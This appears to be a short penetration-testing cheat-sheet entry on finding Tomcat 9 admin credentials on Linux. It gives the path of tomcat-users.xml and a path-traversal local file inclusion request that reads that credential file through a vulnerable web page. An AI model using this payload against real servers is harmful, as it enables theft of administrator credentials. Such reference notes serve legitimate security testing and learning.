# Tomcat

Admin credentials
----

**Linux system**

Check packages: https://packages.debian.org/sid/all/tomcat9/filelist

```
/usr/share/tomcat9/etc/tomcat-users.xml
```

**LFI**
```
/page?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml
```